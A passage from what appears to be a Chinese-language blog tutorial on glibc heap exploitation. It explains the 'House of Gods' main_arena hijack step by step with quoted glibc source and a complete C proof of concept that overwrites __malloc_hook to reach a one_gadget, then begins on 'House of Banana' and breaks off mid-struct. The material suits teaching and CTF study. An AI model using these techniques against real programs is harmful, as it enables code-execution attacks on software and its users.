  因此如果我们释放一个 0xa0 大小的 chunk 到 small bins 就可以将 binmap 中的第 9 比特置位，此时我们将 <code>binmap</code> 当做一个 0x200 大小的 chunk，则 <code>bk</code> 对应 <code>main_arena</code> 的 <code>next</code> ，<strong>而 <code>main_arena</code> 的 <code>next</code> 指向 <code>main_arena</code> 。</strong><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">                                     [1]        [0]</span><br><span class="line">0x00007ffff7dd3450 00007ffff7dd3438 0000000000000200 &lt;- binmap[0, 1] (fake sizefield)</span><br><span class="line">0x00007ffff7dd3460 0000000000000000 00007ffff7dd2c00 &lt;- next (fake bk pointer)</span><br><span class="line">0x00007ffff7dd3470 0000000000000000 0000000000000001</span><br><span class="line">0x00007ffff7dd3480 0000000000021000 0000000000021000 &lt;- system_mem, max_system_mem</span><br></pre></td></tr></table></figure></div>
因此可以用如下方法把 <code>binmap</code> 以及后面的部分申请出来。</li>
</ul>
<p>首先做如下构造：</p>
<ul>
<li>由于之前释放一个 0xa0 大小的 chunk 到 small bin 中导致 <code>binmap</code> 前 8 字节为 0x200  。</li>
<li><code>FAST40</code> 的 <code>bk</code> 在释放前写入 <code>INTM</code> 的地址。</li>
<li>释放一个 0x20 大小的 chunk 确保 <code>main_arena</code> 所在的 fake chunk 的 <code>size</code> 大于 <code>2 * SIZE_SZ</code> 。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/d6f6ed6475a36c756b54f2aee4b5c758.png"
                      alt="在这里插入图片描述"
                ><br>之后 UAF 修改 <code>SMALLCHUNK</code> 的 <code>bk</code> 字段指向 <code>&amp;main_arena.bins[253]</code> ，结果如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/18d10f0508ac8917c5ebe7a36610e62e.png"
                      alt="在这里插入图片描述"
                ><br>此时 unsorted bin 中有如下结构：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">head -&gt; SMALLCHUNK -&gt; binmap -&gt; main-arena -&gt; FAST40 -&gt; INTM</span><br><span class="line">     bk            bk        bk            bk        bk</span><br></pre></td></tr></table></figure></div>
<p>我们如果 <code>malloc(0x1f8)</code> 就会把 <code>binmap</code> 所在的 fake chunk 申请出来，我们称这个 fake chunk 为 <code>BINMAP</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/c0e5a050c9b8834d034a4051c1ff881d.png"
                      alt="在这里插入图片描述"
                ><br>之后我们考虑通过如何把 <code>arena</code> 切换到 伪造的 <code>arena</code> 上。</p>
<p>在 <code>__libc_malloc</code> 上，我们通过 <code>arena_get</code> 来获取 <code>arena</code> 。由于 <code>arena</code> 的 <code>flags</code> 的值一般为 0 ，因此将宏展开后发现实际上是获取的 <code>thread_arena</code> 的值。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">    arena_get(ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">定义:  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size)   \</span></span><br><span class="line"><span class="meta">    do &#123;                       \</span></span><br><span class="line"><span class="meta">        ptr = thread_arena;    \</span></span><br><span class="line"><span class="meta">        arena_lock(ptr, size); \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br><span class="line">替换:  </span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    ar_ptr = thread_arena;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (ar_ptr &amp;&amp; !(((ar_ptr)-&gt;flags &amp; (<span class="number">4U</span>)))) (<span class="type">void</span>) (&#123;(<span class="type">void</span>)(&#123;<span class="type">int</span> ignore1,ignore2,ignore3;<span class="keyword">if</span>(__builtin_constant_p(<span class="number">0</span>)&amp;&amp;(<span class="number">0</span>)==<span class="number">0</span>)__asm __volatile(<span class="string">&quot;cmpl $0, __libc_multiple_threads(%%rip)\n\t&quot;</span> <span class="string">&quot;je 0f\n\t&quot;</span> <span class="string">&quot;lock; cmpxchgl %4, %2\n\t&quot;</span> <span class="string">&quot;jnz 1f\n\t&quot;</span> <span class="string">&quot;jmp 24f\n&quot;</span> <span class="string">&quot;0:\tcmpxchgl %4, %2\n\t&quot;</span> <span class="string">&quot;jz 24f\n\t&quot;</span> <span class="string">&quot;1:\tlea %2, %%&quot;</span> <span class="string">&quot;rdi&quot;</span> <span class="string">&quot;\n&quot;</span> <span class="string">&quot;2:\tsub $128, %%&quot;</span> <span class="string">&quot;rsp&quot;</span> <span class="string">&quot;\n&quot;</span> <span class="string">&quot;.cfi_adjust_cfa_offset 128\n&quot;</span> <span class="string">&quot;3:\tcallq __lll_lock_wait_private\n&quot;</span> <span class="string">&quot;4:\tadd $128, %%&quot;</span> <span class="string">&quot;rsp&quot;</span> <span class="string">&quot;\n&quot;</span> <span class="string">&quot;.cfi_adjust_cfa_offset -128\n&quot;</span> <span class="string">&quot;24:&quot;</span>:<span class="string">&quot;=S&quot;</span>(ignore1),<span class="string">&quot;=&amp;D&quot;</span>(ignore2),<span class="string">&quot;=m&quot;</span>(*(&amp;ar_ptr-&gt;mutex)),<span class="string">&quot;=a&quot;</span>(ignore3):<span class="string">&quot;0&quot;</span>(<span class="number">1</span>),<span class="string">&quot;m&quot;</span>(*(&amp;ar_ptr-&gt;mutex)),<span class="string">&quot;3&quot;</span>(<span class="number">0</span>):<span class="string">&quot;cx&quot;</span>,<span class="string">&quot;r11&quot;</span>,<span class="string">&quot;cc&quot;</span>,<span class="string">&quot;memory&quot;</span>);<span class="keyword">else</span> __asm __volatile(<span class="string">&quot;cmpl $0, __libc_multiple_threads(%%rip)\n\t&quot;</span> <span class="string">&quot;je 0f\n\t&quot;</span> <span class="string">&quot;lock; cmpxchgl %4, %2\n\t&quot;</span> <span class="string">&quot;jnz 1f\n\t&quot;</span> <span class="string">&quot;jmp 24f\n&quot;</span> <span class="string">&quot;0:\tcmpxchgl %4, %2\n\t&quot;</span> <span class="string">&quot;jz 24f\n\t&quot;</span> <span class="string">&quot;1:\tlea %2, %%&quot;</span> <span class="string">&quot;rdi&quot;</span> <span class="string">&quot;\n&quot;</span> <span class="string">&quot;2:\tsub $128, %%&quot;</span> <span class="string">&quot;rsp&quot;</span> <span class="string">&quot;\n&quot;</span> <span class="string">&quot;.cfi_adjust_cfa_offset 128\n&quot;</span> <span class="string">&quot;3:\tcallq __lll_lock_wait\n&quot;</span> <span class="string">&quot;4:\tadd $128, %%&quot;</span> <span class="string">&quot;rsp&quot;</span> <span class="string">&quot;\n&quot;</span> <span class="string">&quot;.cfi_adjust_cfa_offset -128\n&quot;</span> <span class="string">&quot;24:&quot;</span>:<span class="string">&quot;=S&quot;</span>(ignore1),<span class="string">&quot;=D&quot;</span>(ignore2),<span class="string">&quot;=m&quot;</span>(*(&amp;ar_ptr-&gt;mutex)),<span class="string">&quot;=a&quot;</span>(ignore3):<span class="string">&quot;1&quot;</span>(<span class="number">1</span>),<span class="string">&quot;m&quot;</span>(*(&amp;ar_ptr-&gt;mutex)),<span class="string">&quot;3&quot;</span>(<span class="number">0</span>),<span class="string">&quot;0&quot;</span>(<span class="number">0</span>):<span class="string">&quot;cx&quot;</span>,<span class="string">&quot;r11&quot;</span>,<span class="string">&quot;cc&quot;</span>,<span class="string">&quot;memory&quot;</span>);&#125;);<span class="number">0</span>; &#125;);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            ar_ptr = arena_get2((bytes), ((<span class="type">void</span> *) <span class="number">0</span>));</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>
<p>在 <code>arena_get</code> 获取 <code>arena</code> 后会调用 <code>_int_malloc</code> 尝试申请内存，如果 <code>_int_malloc</code> 返回 NULL 则调用 <code>arena_get_retry</code> 和 <code>_int_malloc</code> 尝试再次分配内存。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">arena_get(ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line"><span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">   before.  */</span></span><br><span class="line"><span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    LIBC_PROBE(memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">    ar_ptr = arena_get_retry(ar_ptr, bytes);</span><br><span class="line">    victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于 <code>arena</code> 为 <code>main_arena</code> ，因此实际上调用的是 <code>arena_get2</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> mstate</span><br><span class="line"><span class="title function_">arena_get_retry</span><span class="params">(mstate ar_ptr, <span class="type">size_t</span> bytes)</span> &#123;</span><br><span class="line">    LIBC_PROBE(memory_arena_retry, <span class="number">2</span>, bytes, ar_ptr);</span><br><span class="line">    <span class="keyword">if</span> (ar_ptr != &amp;main_arena) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        (<span class="type">void</span>) mutex_unlock(&amp;ar_ptr-&gt;mutex);</span><br><span class="line">        ar_ptr = arena_get2(bytes, ar_ptr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ar_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 <code>arena_get2</code> 函数中，我们有两种方式获取 <code>arena</code> 。</p>
<ul>
<li>如果 <code>n &lt;= narenas_limit - 1</code> 则调用 <code>_int_new_arena</code> 创建一个新的 <code>arena</code> 。</li>
<li>否则调用 <code>reused_arena</code> 从现有的 <code>arena</code> 中找一个可用的 <code>arena</code> 。<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> mstate internal_function <span class="title function_">arena_get2</span><span class="params">(<span class="type">size_t</span> size, mstate avoid_arena)</span> &#123;</span><br><span class="line">    mstate a;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">size_t</span> narenas_limit;</span><br><span class="line"></span><br><span class="line">    a = get_free_list(); <span class="comment">// 调试发现返回 NULL</span></span><br><span class="line">    <span class="keyword">if</span> (a == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/* Nothing immediately available, so generate a new arena.  */</span></span><br><span class="line">        <span class="keyword">if</span> (narenas_limit == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mp_.arena_max != <span class="number">0</span>)</span><br><span class="line">                narenas_limit = mp_.arena_max;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (narenas &gt; mp_.arena_test) &#123;</span><br><span class="line">                <span class="type">int</span> n = __get_nprocs();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (n &gt;= <span class="number">1</span>)</span><br><span class="line">                    narenas_limit = NARENAS_FROM_NCORES(n);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="comment">/* We have no information about the system.  Assume two</span></span><br><span class="line"><span class="comment">                   cores.  */</span></span><br><span class="line">                    narenas_limit = NARENAS_FROM_NCORES(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    repeat:;</span><br><span class="line">        <span class="type">size_t</span> n = narenas;</span><br><span class="line">        <span class="comment">/* NB: the following depends on the fact that (size_t)0 - 1 is a</span></span><br><span class="line"><span class="comment">         very large number and that the underflow is OK.  If arena_max</span></span><br><span class="line"><span class="comment">         is set the value of arena_test is irrelevant.  If arena_test</span></span><br><span class="line"><span class="comment">         is set but narenas is not yet larger or equal to arena_test</span></span><br><span class="line"><span class="comment">         narenas_limit is 0.  There is no possibility for narenas to</span></span><br><span class="line"><span class="comment">         be too big for the test to always fail since there is not</span></span><br><span class="line"><span class="comment">         enough address space to create that many arenas.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(n &lt;= narenas_limit - <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (catomic_compare_and_exchange_bool_acq(&amp;narenas, n + <span class="number">1</span>, n))</span><br><span class="line">                <span class="keyword">goto</span> repeat;</span><br><span class="line">            a = _int_new_arena(size);</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(a == <span class="literal">NULL</span>))</span><br><span class="line">                catomic_decrement(&amp;narenas);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            a = reused_arena(avoid_arena);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<code>reused_arena</code> 从 <code>next_to_use</code> 开始沿 <code>arena.next</code> 链表找第一个满足 <code>!arena_is_corrupt(result) &amp;&amp; !mutex_trylock(&amp;result-&gt;mutex)</code> 的 <code>arena</code> ，<strong>并且会将找到的 <code>arena</code> 赋值给 <code>thread_arena</code> ，然后更新 <code>next_to_use</code> 为下一个 <code>arena</code></strong> 。<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> mstate</span><br><span class="line"><span class="title function_">reused_arena</span><span class="params">(mstate avoid_arena)</span> &#123;</span><br><span class="line">    mstate result;</span><br><span class="line">    <span class="comment">/* <span class="doctag">FIXME:</span> Access to next_to_use suffers from data races.  */</span></span><br><span class="line">    <span class="type">static</span> mstate next_to_use;</span><br><span class="line">    <span class="keyword">if</span> (next_to_use == <span class="literal">NULL</span>)</span><br><span class="line">        next_to_use = &amp;main_arena;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Iterate over all arenas (including those linked from</span></span><br><span class="line"><span class="comment">     free_list).  */</span></span><br><span class="line">    result = next_to_use;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!arena_is_corrupt(result) &amp;&amp; !mutex_trylock(&amp;result-&gt;mutex))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* <span class="doctag">FIXME:</span> This is a data race, see _int_new_arena.  */</span></span><br><span class="line">        result = result-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">while</span> (result != next_to_use);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">out:</span><br><span class="line">    ...</span><br><span class="line">    thread_arena = result;</span><br><span class="line">    next_to_use = result-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
因此我们可以修改 <code>main_arena.next</code> 指向伪造的 <code>arena</code> 然后<strong>两次</strong>调用 <code>malloc(0xffffffffffffffbf + 1);</code> 通过 <code>checked_request2size(bytes, nb);</code> 宏使得 <code>_int_malloc</code> 返回 NULL，最终使得 <code>thread_arena</code> 指向我们伪造的 <code>arena</code> 。具体过程如下：</li>
</ul>
<p>首先需要确保 <code>narenas &gt; narenas_limit - 1</code> 从而调用 <code>reused_arena</code> ，因此要构造 unsorted bin attack 将 <code>narenas</code> 改成一个较大的数。</p>
<ul>
<li>为了确保从 unsorted bin 中取出的 chunk 能通过 <code>victim-&gt;size &gt; av-&gt;system_mem</code> 检查，我们将 <code>main_arena.system_mem</code> 赋值为 0xffffffffffffffff 。</li>
<li>将 <code>INTM.bk</code> 指向 <code>&amp;narenas - 0x10</code> 构造 unsorted bin attack 。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/5d5ab77efb8ef664ee277095ad929a90.png"
                      alt="在这里插入图片描述"
                ><br>将 <code>INTM</code> 申请出来，此时 <code>arenas</code> 上被写入了 <code>&amp;main_arena.top</code> 。</p>
<p>将 <code>main_arena.next</code> 指向 <code>INTM</code> ，连续两次 <code>malloc(0xffffffffffffffbf + 1);</code> 将<code>thread_arena</code> 指向我们伪造的 <code>INTM</code> ：</p>
<ul>
<li>第一次 <code>malloc(0xffffffffffffffbf + 1);</code> 使得 <code>thread_arena</code> 指向 <code>main_arena</code> ，<code>next_to_use</code> 指向 <code>INTM</code> 。</li>
<li>第一次 <code>malloc(0xffffffffffffffbf + 1);</code> 使得 <code>thread_arena</code> 指向 <code>INTM</code> 。</li>
</ul>
<p>之后将 <code>*(uint64_t*) (INTM+0x30)</code> 指向伪造的 chunk ，此时如果 <code>malloc(0x68)</code> 就会将目标地址处的内存申请出来。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/d9e59dc2cab49ed4aa3347a08d1e2678.png"
                      alt="在这里插入图片描述"
                ><br><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_gods" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">void</span> *SMALLCHUNK = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">    <span class="type">void</span> *FAST20 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">void</span> *FAST40 = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] leak libc base.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(SMALLCHUNK);</span><br><span class="line">    <span class="type">uint64_t</span> leak = *((<span class="type">uint64_t</span> *) SMALLCHUNK);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] set binmap.&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *INTM = <span class="built_in">malloc</span>(<span class="number">0x98</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijack main_arena.&quot;</span>);</span><br><span class="line">    SMALLCHUNK = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">    <span class="built_in">free</span>(SMALLCHUNK);</span><br><span class="line">    *((<span class="type">uint64_t</span> *) (SMALLCHUNK + <span class="number">0x8</span>)) = leak + <span class="number">0x7f8</span>;</span><br><span class="line">    *((<span class="type">uint64_t</span> *) (FAST40 + <span class="number">0x8</span>)) = (<span class="type">uint64_t</span>) (INTM - <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(FAST20);</span><br><span class="line">    <span class="built_in">free</span>(FAST40);</span><br><span class="line">    <span class="type">void</span> *BINMAP = <span class="built_in">malloc</span>(<span class="number">0x1f8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] switch to fake arena.&quot;</span>);</span><br><span class="line">    *((<span class="type">uint64_t</span> *) (INTM + <span class="number">0x8</span>)) = leak - <span class="number">0xa40</span>;</span><br><span class="line">    *((<span class="type">uint64_t</span> *) (BINMAP + <span class="number">0x20</span>)) = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">    INTM = <span class="built_in">malloc</span>(<span class="number">0x98</span>);</span><br><span class="line">    *((<span class="type">uint64_t</span> *) (BINMAP + <span class="number">0x8</span>)) = (<span class="type">uint64_t</span>) (INTM - <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xffffffffffffffbf</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xffffffffffffffbf</span> + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary address alloc.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="type">uint64_t</span> *) (INTM + <span class="number">0x20</span>)) = leak - <span class="number">0x8b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijack __malloc_hook.&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *FAKECHUNK = <span class="built_in">malloc</span>(<span class="number">0x68</span>);</span><br><span class="line">    *(<span class="type">uint64_t</span> *) (FAKECHUNK + <span class="number">0x13</span>) = leak - <span class="number">0x2c5f71</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger one_gadget.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x114514</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="House-of-Banana"><a href="#House-of-Banana" class="headerlink" title="House of Banana"></a>House of Banana</h1><p>在 ld.so 中定义了一个类型为 rtld_global 的全局变量 _rtld_global 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* This is the structure which defines all variables global to ld.so</span></span><br><span class="line"><span class="comment">   (except those which cannot be added for some reason).  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> _<span class="title">rtld_global</span> =</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Get architecture specific initializer.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dl-procruntime.c&gt;</span></span></span><br><span class="line">    <span class="comment">/* Generally the default presumption without further information is an</span></span><br><span class="line"><span class="comment">     * executable stack but this is not true for all platforms.  */</span></span><br><span class="line">    ._dl_stack_flags = DEFAULT_STACK_PERMS,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC_REENTRANT</span></span><br><span class="line">    ._dl_load_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER,</span><br><span class="line">    ._dl_load_write_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ._dl_nns = <span class="number">1</span>,</span><br><span class="line">    ._dl_ns =</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC_REENTRANT</span></span><br><span class="line">      [LM_ID_BASE] = &#123; ._ns_unique_sym_table</span><br><span class="line">		       = &#123; .lock = _RTLD_LOCK_RECURSIVE_INITIALIZER &#125; &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></div>
<p>其中 rtld_global 类型部分定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;</span></span><br><span class="line"><span class="comment">     must remain the first element.  Forever.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Non-shared code has no support for multiple namespaces.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_NNS 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_NNS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  EXTERN <span class="class"><span class="keyword">struct</span> <span class="title">link_namespaces</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* A pointer to the map for the main map.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">ns_loaded</span>;</span></span><br><span class="line">    <span class="comment">/* Number of object in the _dl_loaded list.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_nloaded;</span><br><span class="line">    <span class="comment">/* Direct pointer to the searchlist of the main object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *_<span class="title">ns_main_searchlist</span>;</span></span><br><span class="line">    <span class="comment">/* This is zero at program start to signal that the global scope map is</span></span><br><span class="line"><span class="comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span></span><br><span class="line"><span class="comment">       reset if in _dl_close if the last global object is removed.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* During dlopen, this is the number of objects that still need to</span></span><br><span class="line"><span class="comment">       be added to the global scope map.  It has to be taken into</span></span><br><span class="line"><span class="comment">       account when resizing the map, for future map additions after</span></span><br><span class="line"><span class="comment">       recursive dlopen calls from ELF constructors.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_global_scope_pending_adds;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Once libc.so has been loaded into the namespace, this points to</span></span><br><span class="line"><span class="comment">       its link map.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">libc_map</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search table for unique objects.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym_table</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      __rtld_lock_define_recursive (, lock)</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">	<span class="type">uint32_t</span> hashval;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">	<span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">      &#125; *entries;</span><br><span class="line">      <span class="type">size_t</span> size;</span><br><span class="line">      <span class="type">size_t</span> n_elements;</span><br><span class="line">      <span class="type">void</span> (*<span class="built_in">free</span>) (<span class="type">void</span> *);</span><br><span class="line">    &#125; _ns_unique_sym_table;</span><br><span class="line">    <span class="comment">/* Keep track of changes to each namespace&#x27; list.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span> _<span class="title">ns_debug</span>;</span></span><br><span class="line">  &#125; _dl_ns[DL_NNS];</span><br><span class="line">  <span class="comment">/* One higher than index of last used namespace.  */</span></span><br><span class="line">  EXTERN <span class="type">size_t</span> _dl_nns;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure></div>
<p>这里只需要关注 link_namespaces 类型的数组 _dl_ns[DL_NNS] 和该数组中有效元素的数量 _dl_nns 以及 link_map 类型的指针 _ns_loaded 和该指针指向的链表元素数量 _ns_nloaded 。</p>
<p>link_map 相关结构如下：<br>其中主要关注的是 l_addr，l_next，l_real，l_info[DT_FINI_ARRAY]（l_info[26]），l_info[DT_FINI_ARRAYSZ]（l_info[28]），l_init_called。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="type">char</span> *l_name;		<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;		<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All following members are internal to the dynamic linker.</span></span><br><span class="line"><span class="comment">       They may change without notice.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is an element which is only ever different from a pointer to</span></span><br><span class="line"><span class="comment">       the very same copy of this type for ld.so when it is used in more</span></span><br><span class="line"><span class="comment">       than one namespace.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of the namespace this link map belongs to.  */</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">    <span 